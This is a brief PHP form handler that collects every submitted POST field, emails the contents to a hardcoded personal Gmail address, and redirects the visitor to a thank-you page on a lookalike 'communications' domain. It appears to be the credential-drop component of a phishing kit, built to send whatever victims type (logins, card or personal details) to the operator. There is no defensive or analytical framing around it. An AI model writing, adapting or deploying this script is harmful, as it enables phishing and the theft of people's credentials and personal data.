<?php
$TO = "atalainber46@gmail.com";

$h  = "From: " . $TO;

$message = "";

while (list($key, $val) = each($_POST)) {
  $message .= "$key : $val\n";
}

mail($TO, $subject, $message, $h);

Header("Location: http://messageiecommunicationsmsinfo.pe.hu//merci.html");

?>